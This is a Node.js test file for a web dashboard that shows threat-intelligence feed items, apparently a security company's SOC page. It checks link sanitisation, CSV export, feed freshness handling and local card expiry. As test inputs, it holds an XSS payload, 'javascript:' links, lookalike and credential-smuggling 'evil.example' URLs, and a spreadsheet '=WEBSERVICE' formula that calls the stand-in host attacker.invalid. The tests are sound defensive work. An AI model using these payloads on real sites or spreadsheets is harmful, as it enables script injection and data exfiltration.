'use strict';
const { test } = require('node:test');
const assert = require('node:assert/strict');
const fs = require('node:fs');
const path = require('node:path');
const desk = require('../soc-intelligence-desk.js');
const runtime = require('../runtime-state.js');
const { PUBLIC_ROOT_FILES } = require('./build-cloudflare-assets.js');
const root = path.join(__dirname, '..');

test('public SOC intelligence desk assets are allowlisted and served by Cloudflare build', () => {
  for (const file of ['soc.html', 'soc-intelligence-desk.js', 'soc-intelligence-desk.css', 'runtime-state.js']) {
    assert.ok(PUBLIC_ROOT_FILES.includes(file), file + ' not public-allowlisted');
    assert.ok(fs.statSync(path.join(root, file)).isFile(), file + ' missing');
  }
  const html = fs.readFileSync(path.join(root, 'soc.html'), 'utf8');
  const runtimePos = html.indexOf('src="/runtime-state.js?');
  const deskPos = html.indexOf('src="/soc-intelligence-desk.js?');
  assert.ok(runtimePos > 0 && deskPos > runtimePos, 'freshness model must load before SOC desk');
  assert.match(html, /id="soc-intelligence-desk"/);
  assert.match(html, /aria-live="polite"/);
  assert.match(html, /data-desk-search/);
  assert.match(html, /data-desk-severity/);
  assert.match(html, /data-desk-exploited/);
  assert.match(html, /href="https:\/\/soc\.cyberdudebivash\.in\/soc\.html"/);
  assert.match(html, /SOC 2 alignment is not a certified SOC 2 audit/);
});

test('normalizeRecords rejects malformed feed and never promotes unrecognized severity', () => {
  assert.equal(desk.normalizeRecords({ items: 'fake' }), null);
  assert.equal(desk.normalizeRecords(null), null);
  const out = desk.normalizeRecords({ items: [
    { id: 'CVE-2026-1234', title: '<img src=x onerror=alert(1)>', threatLevel: 'critical', source: 'cisa_kev', exploited: true, link: '/posts/known.html' },
    { title: 'Evidence pending', threatLevel: 'CUSTOMER_ALERT', source: '', exploited: 'true', link: 'javascript:alert(1)' },
    { foo: 1 }
  ] });
  assert.equal(out.length, 2);
  assert.deepEqual([out[0].severity, out[1].severity], ['CRITICAL', 'UNASSESSED']);
  assert.equal(out[0].exploited, true);
  assert.equal(out[1].exploited, false);
  assert.equal(out[0].href, '/posts/known.html');
  assert.equal(out[1].href, null);
  const script = fs.readFileSync(path.join(root, 'soc-intelligence-desk.js'), 'utf8');
  assert.ok(!script.includes('innerHTML'), 'untrusted CTI text must never become HTML');
  assert.match(script, /\.textContent\s*=/);
});

test('report links restrict authority, scheme, credentials and path', () => {
  assert.equal(desk.safeRecordHref('https://blog.cyberdudebivash.in/posts/alpha.html'), '/posts/alpha.html');
  assert.equal(desk.safeRecordHref('https://soc.cyberdudebivash.in/posts/alpha.html'), '/posts/alpha.html');
  assert.equal(desk.safeRecordHref('/posts/a-b_12.html'), '/posts/a-b_12.html');
  for (const bad of [
    'javascript:alert(1)', '//evil.example/posts/alpha.html',
    'https://soc.cyberdudebivash.in.evil.example/posts/alpha.html',
    'https://soc.cyberdudebivash.in@evil.example/posts/alpha.html',
    'https://evil.example/posts/alpha.html',
    'https://blog.cyberdudebivash.in/posts/alpha.html?token=secret',
    'https://soc.cyberdudebivash.in/api/v1/customer/dashboard',
    'http://blog.cyberdudebivash.in/posts/alpha.html',
    'https://blog.cyberdudebivash.in/posts/../api.html',
  ]) assert.equal(desk.safeRecordHref(bad), null, bad);
});

test('all desk counters count only available feed items and sources, not hypothetical customer incidents', () => {
  const records = desk.normalizeRecords({ items: [
    { title: 'A', threatLevel: 'HIGH', source: 'CISA', exploited: true },
    { title: 'B', threatLevel: 'MEDIUM', source: 'cisa', exploited: false },
    { title: 'C', threatLevel: 'LOW', source: 'nvd', exploited: true }
  ] });
  assert.deepEqual(desk.metrics(records), { records: 3, exploited: 2, sources: 2 });
  assert.equal(desk.filterRecords(records, 'cisa', 'all', false).length, 2);
  assert.equal(desk.filterRecords(records, '', 'HIGH', true).length, 1);
  assert.equal(desk.filterRecords(records, '', 'LOW', false).length, 1);
  assert.equal(desk.filterRecords(records, 'NONEXISTENT', 'all', false).length, 0);
  assert.equal(desk.LIMIT, 12);
});

test('filtered public CTI CSV neutralizes spreadsheet formulas and quotes correctly', () => {
  const malicious = "=WEBSERVICE(\"https://attacker.invalid/\")";
  const cell = desk.csvCell(malicious);
  assert.ok(cell.startsWith('"\'='));
  assert.ok(cell.includes('""https://attacker.invalid/""'));
  for (const value of ['+1+2','-1+2','@sum(A1)','  =2+3','\t=2+3']) {
    assert.ok(desk.csvCell(value).startsWith('"\''),
      'Spreadsheet formula not neutralized: ' + value);
  }
  const rows = desk.buildCsv([{id:'CVE-2026-0001',title:malicious,
    severity:'HIGH',source:'CISA',exploited:true,date:'2026-10-23',
    href:'/posts/a.html'}]);
  assert.match(rows, /"Exploitation flagged"/);
  assert.match(rows, /"Yes \(feed-reported\)"/);
  assert.match(rows, /"https:\/\/soc\.cyberdudebivash\.in\/posts\/a\.html"/);
  assert.ok(rows.endsWith('\r\n'));
});

test('stale or missing public feed cannot be displayed as healthy runtime', () => {
  const stale = runtime.classifyFeed({ ok: true, feed: {
    generatedAt: '2026-01-01T00:00:00.000Z',
    metadata: {lastReportGeneratedAt:'2026-01-01T00:00:00.000Z'}
  }, nowMs: Date.parse('2026-10-23T13:00:00.000Z') });
  const missingReceipt = runtime.classifyFeed({ok:true,feed:{
    generatedAt:'2026-01-01T00:00:00.000Z'
  },nowMs:Date.parse('2026-10-23T13:00:00.000Z')});
  const unavailable = runtime.classifyFeed({ ok: false, error: 'timeout' });
  const invalid = runtime.classifyFeed({ ok: true, feed: { items: [] } });
  assert.equal(stale.state, 'STALE');
  assert.equal(missingReceipt.state,'DEGRADED','missing real report proof is unverified, never live');
  assert.equal(runtime.pipelineAllowsLive(missingReceipt,Date.parse('2026-10-23T13:00:00.000Z')),false);
  assert.equal(unavailable.state, 'UNAVAILABLE');
  assert.equal(invalid.state, 'DEGRADED');
});

test('all data loads are bounded, manual, same-origin and without customer credentials', () => {
  const js = fs.readFileSync(path.join(root, 'soc-intelligence-desk.js'), 'utf8');
  assert.equal(desk.ENDPOINT, '/live-intel.json');
  assert.match(js, /timeoutMs:\s*8000/);
  assert.match(js, /refresh\.addEventListener\('click', fetchFeed\)/);
  assert.ok(!/setInterval\s*\(/.test(js), 'no runaway polling or Cloudflare usage');
  assert.ok(!/localStorage|Authorization:|Cookie:|\/api\/v1\/customer\//.test(js));
});


test('customer SOC desk selects only report additions from the last 24h and deduplicates', () => {
  const now = Date.parse('2026-11-12T12:00:00Z');
  const feed = { items: [
    {id:'OLD', title:'Historical high priority item', _addedAt:'2026-10-23T04:58:15Z', threatLevel:'CRITICAL'},
    {id:'RECENT-A', title:'Recent report A', _addedAt:'2026-11-12T11:00:00Z', pubDate:'2026-11-11', source:'CISA', link:'/posts/report-a.html'},
    {id:'FUTURE', title:'Future-dated report', _addedAt:'2026-11-12T12:00:01Z'},
    {id:'UNKNOWN', title:'Unverified report date'},
    {id:'RECENT-B', title:'Recent report B', _addedAt:'2026-11-12T11:40:00Z', pubDate:'2026-11-12', threatLevel:'HIGH'},
    {id:'RECENT-A', title:'Older duplicate', _addedAt:'2026-11-12T09:00:00Z', pubDate:'2026-11-12'}
  ] };
  const recent = desk.selectRecentRecords(feed, now);
  assert.deepEqual(recent.map(record => record.id), ['RECENT-B','RECENT-A']);
  assert.equal(recent[1].addedAt, '2026-11-12T11:00:00.000Z');
  assert.equal(recent[1].date, '2026-11-11', 'original source date must remain distinct from the platform publication date');
  const healthy = {state:'HEALTHY', timestamp:'2026-11-12T11:00:00.000Z', ageMinutes:60};
  const delayed = {state:'DEGRADED', timestamp:'2026-11-12T10:00:00.000Z', ageMinutes:120};
  assert.deepEqual(desk.availableRecords(feed, healthy, now).map(r=>r.id), ['RECENT-B','RECENT-A']);
  assert.deepEqual(desk.availableRecords(feed, delayed, now).map(r=>r.id), ['RECENT-B','RECENT-A']);
  for (const unverifiable of [
    {state:'DEGRADED', timestamp:null, ageMinutes:null},
    {state:'DEGRADED', timestamp:'2026-11-12T13:00:00.000Z', ageMinutes:null},
    {state:'DEGRADED', timestamp:'2026-11-12T08:00:00.000Z', ageMinutes:240},
    {state:'HEALTHY'}, // a status flag alone cannot certify feed freshness
    {state:'HEALTHY', timestamp:'2026-10-23T04:58:15.000Z', ageMinutes:30}
  ]) {
    assert.deepEqual(desk.availableRecords(feed, unverifiable, now), [],
      'unverified or inconsistent pipeline timestamp must withhold the cards');
  }
  for (const state of ['STALE', 'UNAVAILABLE', 'CHECKING', 'UNVERIFIED']) {
    assert.deepEqual(desk.availableRecords(feed, {state}, now), [], 'old or unverifiable feed never shows records: '+state);
  }
});

test('recent selection enforces the 24h boundary and uses individual timestamps, not the feed heartbeat', () => {
  const now = Date.parse('2026-11-12T12:00:00Z');
  const feed = {generatedAt: '2026-11-12T11:59:00Z', items: [
    {id:'BOUNDARY', title:'Exactly 24h old', _addedAt:'2026-11-11T12:00:00Z', pubDate:'2026-11-11'},
    {id:'TOO-OLD', title:'Older than 24h', _addedAt:'2026-11-11T11:59:59Z'},
    {id:'BAD-CLOCK', title:'Invalid record clock', _addedAt:'not-a-date'},
    {id:'NO-TITLE', _addedAt:'2026-11-12T11:00:00Z'},
    {id:'SOURCE-ONLY', title:'Source date alone is not report addition', pubDate:'2026-11-12'},
    {id:'BAD-ADDED', title:'Malformed platform addition time', _addedAt:'2026-11-12'}
  ]};
  assert.deepEqual(desk.selectRecentRecords(feed, now).map(r=>r.id), ['BOUNDARY']);
  assert.deepEqual(desk.selectRecentRecords({items:[]}, now), []);
  assert.deepEqual(desk.selectRecentRecords(null, now), []);
});


test('manual CTI refresh clears prior cards, counts, timestamp and CSV before network retrieval', () => {
  const code = fs.readFileSync(path.join(root, 'soc-intelligence-desk.js'), 'utf8');
  const start = code.indexOf('function fetchFeed() {');
  const nextNetwork = code.indexOf("return (RS && typeof RS.fetchJson === 'function'", start);
  assert.ok(start !== -1 && nextNetwork > start, 'fetchFeed entry and next request found');
  const preflight = code.slice(start, nextNetwork);
  assert.match(preflight, /setStatus\('CHECKING'/);
  assert.match(preflight, /records = \[\];/);
  assert.match(preflight, /data-desk-sample/);
  assert.match(preflight, /data-desk-exploited-count/);
  assert.match(preflight, /data-desk-sources/);
  assert.match(preflight, /data-desk-published/);
  assert.match(preflight, /show\(\);/);
  assert.ok(preflight.indexOf('records = [];') < preflight.indexOf('show();'),
    'previous records must be removed before rendering the CHECKING state');
});

test('open SOC desk tab rechecks both clocks: a report expires without another network fetch', () => {
  const now = Date.parse('2026-11-14T12:00:00Z');
  const iso = ms => new Date(ms).toISOString();
  const feed = {
    generatedAt: iso(now - 60_000),
    metadata: { lastReportGeneratedAt: iso(now - 60_000) },
    items: [
      {
        id: 'EXPIRING', title: 'Confirmed source-linked report',
        _addedAt: iso(now - 24 * 3600_000 + 60_000),
        pubDate: iso(now - 20 * 3600_000), link: '/posts/confirmed.html',
      },
      {
        id: 'ARCHIVE', title: 'Old research only',
        _addedAt: iso(now - 4 * 3600_000),
        pubDate: iso(now - 5 * 86400_000),
      },
    ],
  };
  const first = desk.reviewSnapshot(feed, now);
  assert.equal(first.classification.state, 'HEALTHY');
  assert.deepEqual(first.records.map(r => r.id), ['EXPIRING']);
  const expired = desk.reviewSnapshot(feed, now + 2 * 60_000);
  assert.equal(expired.classification.state, 'HEALTHY', 'pipeline is still fresh');
  assert.deepEqual(expired.records, [], 'record expiry is independent of pipeline heartbeat');
});

test('open SOC desk tab withholds records after receipt/generation passes 180-minute expiry', () => {
  const now = Date.parse('2026-11-14T12:00:00Z');
  const feed = {
    generatedAt: new Date(now - 60_000).toISOString(),
    metadata: { lastReportGeneratedAt: new Date(now - 60_000).toISOString() },
    items: [{
      id:'CURRENT', title:'Recent threat report',
      _addedAt: new Date(now - 60_000).toISOString(),
      pubDate: new Date(now - 60_000).toISOString(),
    }],
  };
  assert.deepEqual(desk.reviewSnapshot(feed, now).records.map(r => r.id), ['CURRENT']);
  const stale = desk.reviewSnapshot(feed, now + 181 * 60_000);
  assert.equal(stale.classification.state, 'STALE');
  assert.deepEqual(stale.records, []);
  const absent = desk.reviewSnapshot({ items: [] }, now);
  assert.equal(absent.classification.state, 'DEGRADED');
  assert.deepEqual(absent.records, []);
  assert.deepEqual(desk.reviewSnapshot(null, now).records, []);
});

test('local expiry and user-driven filtering/export revalidate without increasing network traffic', () => {
  const code = fs.readFileSync(path.join(root, 'soc-intelligence-desk.js'), 'utf8');
  const initialFetch = code.slice(code.indexOf('function fetchFeed() {'), code.indexOf('    search.addEventListener(', code.indexOf('function fetchFeed() {')));
  const localReview = code.slice(code.indexOf('function reviewAndRender() {'), code.indexOf('function fetchFeed() {'));
  assert.match(localReview, /reviewSnapshot\(snapshot, Date\.now\(\)\)/);
  assert.match(localReview, /records = checked\.records/);
  assert.match(localReview, /if \(!trusted\) records = \[\]/);
  assert.match(localReview, /show\(\)/);
  assert.match(localReview, /root\.setTimeout\(function \(\) \{/);
  assert.match(localReview, /\}, 5000\)/);
  assert.doesNotMatch(localReview, /fetchJson|fetch\(/);
  assert.doesNotMatch(code, /setInterval\s*\(/);
  assert.match(initialFetch, /stopExpiryTimer\(\);\s*snapshot = null/);
  assert.match(code, /document\.addEventListener\('visibilitychange'/);
  assert.match(code, /root\.addEventListener\('focus', reviewAndRender\)/);
  assert.match(code, /search\.addEventListener\('input', reviewAndRender\)/);
  assert.match(code, /severity\.addEventListener\('change', reviewAndRender\)/);
  assert.match(code, /exploited\.addEventListener\('change', reviewAndRender\)/);
  const exportBody = code.slice(code.indexOf("exportButton.addEventListener('click'"));
  assert.ok(exportBody.indexOf('reviewAndRender();') >= 0 &&
    exportBody.indexOf('reviewAndRender();') < exportBody.indexOf('buildCsv(subset)'),
    'CSV cannot be exported before current freshness is reverified');
});

test('long-open SOC tab automatically clears expired cards, export and counters without network requests', async () => {
  const vm = require('node:vm');
  const source = fs.readFileSync(path.join(root, 'soc-intelligence-desk.js'), 'utf8');
  let now = Date.parse('2026-11-14T12:00:00Z');
  class Clock extends Date { static now() { return now; } }
  const iso = n => new Date(n).toISOString();
  const snapshot = {
    generatedAt: iso(now - 60_000),
    metadata: { lastReportGeneratedAt: iso(now - 60_000) },
    items: [
      { id:'EXPIRING', title:'Verified report', _addedAt:iso(now - 24 * 3600_000 + 60_000),
        pubDate:iso(now - 12 * 3600_000), link:'/posts/verified.html' },
    ],
  };
  let requests = 0;
  const listeners = {};
  const timers = new Map();
  let nextTimer = 0;
  const element = () => ({
    dataset:{}, children:[], disabled:false, hidden:false, value:'', checked:false,
    textContent:'', className:'',
    handlers:{},
    addEventListener(name, fn) { this.handlers[name] = fn; },
    append(...children) { this.children.push(...children); },
    appendChild(child) { this.children.push(child); },
    replaceChildren(fragment) { this.children = fragment.children || []; },
    remove() {},
  });
  const selectors = [
    '[data-desk-records]','[data-desk-search]','[data-desk-severity]',
    '[data-desk-exploited]','[data-desk-refresh]','[data-desk-export]',
    '[data-desk-count]','[data-desk-visible]','[data-desk-empty]',
    '[data-desk-state]','[data-desk-state-summary]','[data-desk-status-detail]',
    '[data-desk-sample]','[data-desk-exploited-count]',
    '[data-desk-sources]','[data-desk-published]',
  ];
  const nodes = Object.fromEntries(selectors.map(s => [s, element()]));
  nodes['[data-desk-severity]'].value = 'all';
  const shell = {
    dataset:{}, querySelector(selector) { return nodes[selector] || null; },
  };
  const document = {
    readyState:'complete', hidden:false,
    getElementById(id) { return id === 'soc-intelligence-desk' ? shell : null; },
    createElement:element,
    createDocumentFragment:element,
    addEventListener(name, fn) { listeners[name] = fn; },
    body:{ appendChild() {} },
  };
  const runtimeState = {
    ...runtime,
    fetchJson() { requests++; return Promise.resolve(snapshot); },
  };
  const browser = {
    document, SentinelRuntimeState:runtimeState, handlers:{},
    addEventListener(name, fn) { this.handlers[name] = fn; },
    setTimeout(fn, ms) {
      assert.equal(ms, 5000, 'only local 5-second revalidation allowed');
      const id = ++nextTimer;
      timers.set(id, fn);
      return id;
    },
    clearTimeout(id) { timers.delete(id); },
  };
  vm.runInNewContext(source, {window:browser, Date:Clock, URL, Set, Promise});
  await Promise.resolve();
  await Promise.resolve();
  const list = nodes['[data-desk-records]'];
  const csv = nodes['[data-desk-export]'];
  assert.equal(requests, 1);
  assert.equal(list.children.length, 1, 'initial verified report appears');
  assert.equal(csv.disabled, false);
  assert.equal(nodes['[data-desk-sample]'].textContent, '1');
  assert.equal(timers.size, 1, 'one local expiry timeout is scheduled');

  now += 2 * 60_000; // report crosses 24h; generator remains <90min old
  const [timerId, tick] = timers.entries().next().value;
  timers.delete(timerId);
  tick();
  assert.equal(requests, 1, 'timer must not request another API/feed payload');
  assert.equal(list.children.length, 0, 'expired card is removed');
  assert.equal(csv.disabled, true, 'expired CSV export is disabled');
  assert.equal(nodes['[data-desk-sample]'].textContent, '0');
  assert.equal(nodes['[data-desk-count]'].textContent, '0');
  assert.equal(timers.size, 1, 'clock check is rescheduled without network');

  now += 181 * 60_000; // pipeline becomes stale while tab is suspended
  listeners.visibilitychange();
  assert.equal(nodes['[data-desk-state]'].textContent, 'STALE');
  assert.equal(list.children.length, 0);
  assert.equal(nodes['[data-desk-exploited-count]'].textContent, '0');
  assert.equal(requests, 1, 'tab visibility rechecks cached snapshot only');
  browser.handlers.focus();
  nodes['[data-desk-search]'].handlers.input();
  csv.handlers.click();
  assert.equal(requests, 1, 'focus, filter and export are local-only');
  assert.equal(csv.disabled, true);
});
